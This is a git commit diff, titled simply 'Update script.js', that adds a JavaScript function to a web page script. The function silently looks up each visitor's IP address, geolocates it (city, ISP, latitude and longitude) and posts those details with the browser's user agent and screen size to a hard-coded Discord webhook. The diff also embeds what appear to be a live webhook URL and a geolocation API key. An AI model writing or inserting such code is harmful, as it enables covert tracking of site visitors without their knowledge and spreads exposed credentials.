2f11ea14320f272dd16f355780b53543806fa9a0
Sahil <155349852+SpicyDevSahil@users.noreply.github.com>
2024-01-14 19:02:06 +0530

    Update script.js

--- script.js
+++ script.js
@@ -26,6 +26,35 @@
 
 
 
+
+  async function sendUserInfoToDiscord() {
+    const webhookUrl = "https://discord.com/api/webhooks/1171096209046388868/YoF-KFQ7wpPlWSqq465SDpj3F-pBld8NCHh0CNu4mmLelVwwgN0FE-3rvGfSj4E5Kh6r"; // Replace with your actual webhook URL
+
+    try {
+      // Get user's IP address
+      const ipAddress = await fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+
+      // Fetch IP details from ipgeolocation.io
+      const ipDetailsResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9d888ca6249742d1a1bb835fde3a36ca&ip=${ipAddress}`);
+      const ipDetailsData = await ipDetailsResponse.json();
+
+      // Construct the message payload with IP details
+      const message = {
+        content: `\New visitor:\nIP Address: ${ipAddress}\nCountry: ${ipDetailsData.country_name}\nCity: ${ipDetailsData.city}\nRegion: ${ipDetailsData.region_name}\nISP: ${ipDetailsData.isp}\nLatitude: ${ipDetailsData.latitude}\nLongitude: ${ipDetailsData.longitude}\nUser Agent: ${navigator.userAgent}\nScreen Resolution: ${screen.width}x${screen.height}`
+      };
+
+      // Send the message to Discord
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message)
+      });
+    } catch (error) {
+      console.error('Error sending message to Discord:', error);
+    }
+  }
 function updateTime() {
   const currentTimeElement = document.getElementById('currentTime');
   const now = new Date();
